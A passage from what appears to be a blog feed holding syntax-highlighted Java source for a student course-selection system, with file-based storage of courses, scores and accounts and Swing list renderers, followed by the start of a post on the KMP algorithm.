db.getScoreCourse(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生可选课程。 返回可选课程字典</span></span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourseStuNotSelected</span><span class="params">(<span class="type">int</span> account_id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> db.getCourseNotSelected(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生所选课程信息。 返回所选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreStu</span><span class="params">(<span class="type">int</span> account_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> db.getScoreStu(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Database</span> &#123;</span><br><span class="line">    <span class="comment">// 存储文件</span></span><br><span class="line">    <span class="keyword">private</span> File data_course;</span><br><span class="line">    <span class="keyword">private</span> File data_score;</span><br><span class="line">    <span class="keyword">private</span> File data_account;</span><br><span class="line">    <span class="comment">// 当前最大编号，用于新增时</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">course_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">student_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">teacher_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">manager_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 运行时数据存储</span></span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, List&gt; course = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, List&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, List&gt; account = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, List&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, String&gt; manager = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, String&gt; teacher = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, String&gt; student = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;List&gt; score = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 参数：存储文件位置</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Database</span><span class="params">(String file_course, String file_score, String file_account)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.data_course = <span class="keyword">new</span> <span class="title class_">File</span>(file_course);</span><br><span class="line">        <span class="built_in">this</span>.data_score = <span class="keyword">new</span> <span class="title class_">File</span>(file_score);</span><br><span class="line">        <span class="built_in">this</span>.data_account = <span class="keyword">new</span> <span class="title class_">File</span>(file_account);</span><br><span class="line">        <span class="built_in">this</span>.readIn();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourse</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> course;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourseNotSelected</span><span class="params">(<span class="type">int</span> student_id)</span> &#123;</span><br><span class="line">        HashMap&lt;Integer, List&gt; map_copy = (HashMap&lt;Integer, List&gt;) course.clone();</span><br><span class="line">        System.out.println(map_copy.toString());</span><br><span class="line">        <span class="keyword">for</span>(List l: score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id) &#123;</span><br><span class="line">                map_copy.remove((<span class="type">int</span>)l.get(<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(map_copy.toString());</span><br><span class="line">        <span class="keyword">return</span> map_copy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getTeacherCourse</span><span class="params">(<span class="type">int</span> teacher_id)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">teacher_course_list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(Entry&lt;Integer, List&gt; entry: course.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)entry.getValue().get(<span class="number">1</span>)==teacher_id) &#123;</span><br><span class="line">                teacher_course_list.add((<span class="type">int</span>)entry.getKey());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> teacher_course_list;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreCourse</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        ArrayList&lt;List&gt; list_copy = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(List l : score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">1</span>)==course_id) &#123;</span><br><span class="line">                list_copy.add(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list_copy;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, String&gt; <span class="title function_">getTeacher</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teacher;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, String&gt; <span class="title function_">getStudent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScore</span><span class="params">(<span class="type">int</span> student_id)</span> &#123;</span><br><span class="line">        ArrayList&lt;List&gt; list_copy = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(List l : score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id) &#123;</span><br><span class="line">                list_copy.add(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list_copy;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreStu</span><span class="params">(<span class="type">int</span> student_id)</span> &#123;</span><br><span class="line">        ArrayList&lt;List&gt; list_copy = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(List l : score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id) &#123;</span><br><span class="line">                list_copy.add(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list_copy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;String, List&gt; <span class="title function_">getAccount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getAccount</span><span class="params">(String user)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account.get(user);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//从文件中读入课程、用户名等数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readIn</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_course,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_score</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_score,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_account</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_account,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="variable">fileLength</span> <span class="operator">=</span> raf_course.length();</span><br><span class="line">        <span class="type">long</span> <span class="variable">filePoint</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> course_id;</span><br><span class="line">        String course_name;</span><br><span class="line">        <span class="type">int</span> course_teacher_id;</span><br><span class="line">        String course_info;</span><br><span class="line">        raf_course.seek(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            <span class="built_in">this</span>.course_id = Integer.parseInt(raf_course.readLine());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            course_id = Integer.parseInt(raf_course.readLine());</span><br><span class="line">            course_name = raf_course.readLine();</span><br><span class="line">            course_name = <span class="keyword">new</span> <span class="title class_">String</span>(course_name.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            course_teacher_id = Integer.parseInt(raf_course.readLine());</span><br><span class="line">            course_info = raf_course.readLine();</span><br><span class="line">            course_info = <span class="keyword">new</span> <span class="title class_">String</span>(course_info.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            course.put(course_id, Arrays.asList(course_name,course_teacher_id,course_info));</span><br><span class="line">            filePoint = raf_course.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        raf_course.close();</span><br><span class="line">        </span><br><span class="line">        fileLength = raf_account.length();</span><br><span class="line">        filePoint = <span class="number">0</span>;</span><br><span class="line">        String account_user;</span><br><span class="line">        String account_pwd;</span><br><span class="line">        <span class="type">int</span> account_type;</span><br><span class="line">        Integer account_id;</span><br><span class="line">        String account_name;</span><br><span class="line"></span><br><span class="line">        raf_account.seek(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            <span class="built_in">this</span>.manager_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            <span class="built_in">this</span>.teacher_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            <span class="built_in">this</span>.student_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            filePoint = raf_account.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            account_user = raf_account.readLine();</span><br><span class="line">            account_user = <span class="keyword">new</span> <span class="title class_">String</span>(account_user.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            account_pwd = raf_account.readLine();</span><br><span class="line">            account_pwd = <span class="keyword">new</span> <span class="title class_">String</span>(account_pwd.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            account_type = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            account_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            account_name = raf_account.readLine();</span><br><span class="line">            account_name = <span class="keyword">new</span> <span class="title class_">String</span>(account_name.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            <span class="keyword">switch</span>(account_type) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    manager.put(account_id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    teacher.put(account_id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    student.put(account_id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            account.put(account_user, Arrays.asList(account_pwd, account_type, account_id,account_name));</span><br><span class="line">            filePoint = raf_account.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        raf_account.close();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        fileLength = raf_score.length();</span><br><span class="line">        filePoint = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> student_id;</span><br><span class="line">        <span class="type">int</span> student_course_id;</span><br><span class="line">        <span class="type">int</span> student_score;</span><br><span class="line">        raf_score.seek(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            student_id = Integer.parseInt(raf_score.readLine());</span><br><span class="line">            student_course_id = Integer.parseInt(raf_score.readLine());</span><br><span class="line">            student_score = Integer.parseInt(raf_score.readLine());</span><br><span class="line">            score.add(Arrays.asList(student_id,student_course_id,student_score));</span><br><span class="line">            filePoint = raf_score.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        raf_score.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建用户  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAccount</span><span class="params">(String account_user, String account_pwd, <span class="type">int</span> account_type, String account_name)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(!account.containsKey(account_user)) &#123;</span><br><span class="line">            <span class="keyword">switch</span>(account_type) &#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="number">0</span>):</span><br><span class="line">                    manager_id = manager_id+<span class="number">1</span>;</span><br><span class="line">                    id = manager_id;</span><br><span class="line">                    manager.put(id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="number">1</span>):</span><br><span class="line">                    teacher_id = teacher_id+<span class="number">1</span>;</span><br><span class="line">                    id = teacher_id;</span><br><span class="line">                    teacher.put(id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="number">2</span>):</span><br><span class="line">                    student_id = student_id+<span class="number">1</span>;</span><br><span class="line">                    id = student_id;</span><br><span class="line">                    student.put(id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            account.put(account_user, Arrays.asList(account_pwd, account_type, id, account_name));</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Account &quot;</span>+account_user+<span class="string">&quot; has already exists.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        updateAccountData();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCourse</span><span class="params">(String course_name, <span class="type">int</span> course_teacher_id, String course_info)</span> &#123;</span><br><span class="line">        course_id = course_id + <span class="number">1</span>;</span><br><span class="line">        course.put(course_id, Arrays.asList(course_name, course_teacher_id, course_info));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        score.add(Arrays.asList(student_id, course_id, -<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;del &quot;</span>+student_id+<span class="string">&quot; &quot;</span>+course_id);</span><br><span class="line">        Iterator&lt;List&gt; i = score.iterator();</span><br><span class="line">        <span class="keyword">while</span>(i.hasNext())&#123;</span><br><span class="line">            <span class="type">List</span> <span class="variable">l</span> <span class="operator">=</span> i.next();</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id &amp; (<span class="type">int</span>)l.get(<span class="number">1</span>)==course_id)&#123;</span><br><span class="line">                i.remove();</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addStuScore</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id, <span class="type">int</span> student_score)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(List&lt;Integer&gt; l:score) &#123;</span><br><span class="line">            <span class="keyword">if</span>(l.get(<span class="number">0</span>)==student_id &amp; l.get(<span class="number">1</span>)==course_id) &#123;</span><br><span class="line">                l.set(<span class="number">2</span>, student_score);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clearFile</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FileWriter</span>(file);</span><br><span class="line">        fileWriter.write(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        fileWriter.flush();</span><br><span class="line">        fileWriter.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateCourseData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        clearFile(data_course);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_course,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        raf_course.writeBytes(course_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> key:course.keySet()) &#123;</span><br><span class="line">            raf_course.write((key+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_course.write((course.get(key).get(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_course.write((course.get(key).get(<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_course.write((course.get(key).get(<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        raf_course.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateScoreData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        clearFile(data_score);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_score</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_score,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(List l:score) &#123;</span><br><span class="line">            raf_score.write((l.get(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_score.write((l.get(<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_score.write((l.get(<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        raf_score.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//更新课程数据</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateAccountData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        clearFile(data_account);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_account</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_account,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        raf_account.writeBytes(manager_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        raf_account.writeBytes(teacher_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        raf_account.writeBytes(student_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(String key:account.keySet()) &#123;</span><br><span class="line">            raf_account.write((key+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">3</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        raf_account.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 文件内容更新</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updataAll</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        updateCourseData();</span><br><span class="line">        updateScoreData();</span><br><span class="line">        updateAccountData();</span><br><span class="line">        System.out.println(<span class="string">&quot;update finish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ScoreCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        List&lt;Integer&gt; ci = (List&lt;Integer&gt;) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;学生编号: &quot;</span>+ci.get(<span class="number">0</span>)+<span class="string">&quot;   分数: &quot;</span>+ci.get(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CourseTeaCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ci</span> <span class="operator">=</span> (Integer) value;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;课程编号: &quot;</span>+ci);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CourseSelCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        Entry&lt;Integer, List&gt; ci = (Entry&lt;Integer, List&gt;) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;课程编号: &quot;</span>+ci.getKey()+<span class="string">&quot;   课程名称: &quot;</span>+ci.getValue().get(<span class="number">0</span>)+<span class="string">&quot;   教师编号: &quot;</span>+ci.getValue().get(<span class="number">1</span>)+<span class="string">&quot;   课程信息: &quot;</span>+ci.getValue().get(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CourseDelCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        <span class="type">List</span> <span class="variable">ci</span> <span class="operator">=</span> (List) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;课程编号: &quot;</span>+ci.get(<span class="number">1</span>)+<span class="string">&quot;   分数: &quot;</span>+ci.get(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TeaCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        Entry&lt;Integer, String&gt; ci = (Entry&lt;Integer, String&gt;) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;编号: &quot;</span>+ci.getKey()+<span class="string">&quot;    姓名: &quot;</span>+ci.getValue());</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法</title>
      <link href="/2023/04/08/KMP%E7%AE%97%E6%B3%95/"/>
      <url>/2023/04/08/KMP%E7%AE%97%E6%B3%95/</url>
      
